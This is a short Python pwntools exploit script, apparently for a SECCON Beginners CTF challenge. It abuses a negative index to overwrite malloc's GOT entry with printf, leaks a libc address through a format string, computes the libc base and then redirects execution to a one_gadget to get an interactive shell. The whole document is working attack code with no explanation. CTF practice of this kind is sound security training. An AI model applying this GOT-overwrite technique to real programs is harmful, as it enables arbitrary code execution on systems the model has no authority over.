from pwn import *

LOCAL = 1

r = process('./chall', env={'LD_PRELOAD': './libc-2.27.so'})
l = ELF('./libc-2.27.so')
gdb.attach(r)

if not LOCAL:
  global r 
  r = remote('es.quals.beginners.seccon.jp', 9003)


def rev(s):
  r.recvuntil(': ')
  r.sendline(s)


atol_got = 0x601040
malloc_got = 0x601038
printf_plt = 0x400590

rev('-2')
rev(str(malloc_got))
rev(p64(0xdeadbeef)+p64(printf_plt))
rev('%25$p')  # <__libc_start_main+231>

libc_base = int(r.recv()[:14], 16) - 231 - l.sym['__libc_start_main']
log.info('libc base: {}'.format(hex(libc_base)))

one_gadget = libc_base + 0x10a38c
rev(p64(0xdeadbeef)+p64(one_gadget))


r.interactive()




